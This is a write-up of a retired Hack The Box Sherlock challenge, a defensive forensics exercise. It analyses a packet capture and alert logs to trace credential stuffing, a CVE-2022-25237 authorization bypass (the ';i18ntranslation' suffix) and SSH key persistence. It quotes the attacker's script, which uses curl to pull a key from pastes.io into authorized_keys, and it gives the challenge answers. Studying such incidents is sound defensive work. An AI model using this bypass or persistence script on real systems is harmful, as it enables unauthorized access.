---
title: "HTB Sherlock: Meerkat"
seoTitle: "HTB Sherlock: Meerkat Write-up"
seoDescription: "PCAP analysis with Wireshark and TShark combined. JSON parsing with jq CLI."
datePublished: Fri Mar 22 2024 08:00:09 GMT+0000 (Coordinated Universal Time)
cuid: clu2dfk5t002809l620qcfibh
slug: htb-sherlock-meerkat
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1710798321421/3ec8aadf-489f-4a91-89cd-21fb592efb24.png
tags: soc, ethical-hacking, pcap, dfir

---

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">This write-up is a part of the <a target="_blank" rel="noopener noreferrer nofollow" href="https://blog.cyberethical.me/series/htb-sherlocks" style="pointer-events: none">HTB Sherlocks series</a>. Sherlocks are investigative challenges that test defensive security skills. I encourage you to try them out if you like digital forensics, incident response, post-breach analysis and malware analysis. <a target="_blank" rel="noopener noreferrer nofollow" href="https://affiliate.hackthebox.com/sherlocks2352" style="pointer-events: none">Are you ready to start the investigation?</a></div>
</div>

# Incident Details

**Name**: [Meerkat](https://affiliate.hackthebox.com/sherlocks-meerkat)*(Retired)*  
**Category**: SOC  
**Difficulty**: Easy ([Solved](https://labs.hackthebox.com/achievement/sherlock/555018/552))

> As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren't the most security aware. As our new security provider we'd like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

%%[support-cta] 

# Evidences

01: ZIP archive, password protected (`hacktheblue`)

```plaintext
$ meerkat.zip
a76867ade304c8081e2023cbf2977c65e8c146180b2e0ff760e4059d042c2a5a
```

02: JSON file

```plaintext
$ meerkat.zip/meerkat-alerts.json
012aa4e8aae5d500c001510d6e65567eb0cdbfffe2dab9a119b66f7770c222be
```

03: pcapng capture file

```plaintext
$ meerkat.zip/meerkat.pcap
aa3838dbd634f9798d1e9505d243a4fee1d340d6e25e2f0c9648dd64e2178dbf
```

# Analysis

In this scenario we have 10 questions to answer.

1. We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?
    

```plaintext
$ cat meerkat-alerts.json | jq .[].alert.signature | sort | uniq > alerts.sorted.unique
```

I'm assuming the application in question is the mentioned Business Management Platform. There are couple lines containing same name (blurred):

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710743537112/5a82c238-76c2-4b2a-b66f-c524ed698af5.png align="center")

2. We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?
    

Browsing the logs I can see the multiple alerts for "Default User Login Attempt" and "python-requests".

**Answer**: `Credential Stuffing`

3. Does the vulnerability exploited have a CVE assigned - and if so, which one?
    

Clear in the logs.

**Answer**: `CVE-2022-25237`

4. Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?
    

CVE-2022-25237 exploit is performed by appending `;i18ntranslation` or `/../i18ntranslation/` to the end of a URL, so I'm opening `meerkat.pcap` in Wireshark. Alerts indicate that Credential Stuffing was performed from 138.199.59.221 to 172.31.6.44. Then I just looked in the requests to identify which of two strings was used.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710717172821/12b558cc-75d2-4ca2-a44f-045b91f07a33.png align="center")

**Answer**: `;i18ntranslation`

5. How many combinations of usernames and passwords were used in the credential stuffing attack?
    

Now let's use commandline `TShark` to filter and format output so that we have easier way to answer

```plaintext
$ tshark -r meerkat.pcap -2 -R "http.request.full_uri contains loginservice" -T fields -e "tcp.segment_data" | sort | uniq |  xxd -p -r
```

Pass `meerkat.pcap` file to `tshark`, filter packets by only those where request URI contains `loginservice`, show only single field - `tcp.segment_data` (that holds POST body), then sort those values and output unique values to `xxd` tool that will output in ASCII format.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710717214399/8d3e82d2-2971-489a-a25e-971ea13d1ae4.png align="center")

Unfortunately I was not able to break the lines after xdd so I've done that in the text editor. There are 57 unique combinations, one of which (`username=install&password=install`) is not a part of credential stuffing.

**Answer**: `56`

6. Which username and password combination was successful?
    

Search in Wireshark for the response that sets "JSESSIONID" cookie, then follow the HTTP stream. See what credentials were used.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710743779703/34841e69-09fa-44b6-8918-aec9701346d9.png align="center")

7. If any, which text sharing site did the attacker utilise?
    

This time I was lucky becasue the answer was in the previous screen/filter.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710717254541/da2f1a13-cb14-4cd8-8ec3-7e04184bd6b9.png align="center")

**Answer**: `pastes.io`

Bonus: contents of the reqested URLs are still active and contains scripts that adds SSH key to the `authorized_keys` collection and restarts SSH daemon.

8. Please provide the filename of the public key used by the attacker to gain persistence on our host.
    

From the Bonus section of the last question - content of the first script:

```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

**Answer**: `hffgra4unv`

9. Can you confirmed the file modified by the attacker to gain persistence?
    

Again, answer in the above script

**Answer**: `/home/ubuntu/.ssh/authorized_keys`

10. Can you confirm the MITRE technique ID of this type of persistence mechanism?
    

Navigate to [MITRE ATT&CK®](https://attack.mitre.org/) -&gt; Persistence -&gt; SSH Authorized Keys.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710717316679/6b54718a-655d-4c97-b05a-7db92b0e3ccc.png align="center")

**Answer**: `T1098.004`

# Data Recovery

None required.

# Lessons Learned

* `jq` for easier querying JSON data
    
* `tshark` for filtering and parsing PCAP files
    

# Additional readings

%%[follow-cta] 

* [NIST Computer Security Incident Handling Guide](https://www.nist.gov/privacy-framework/nist-sp-800-61)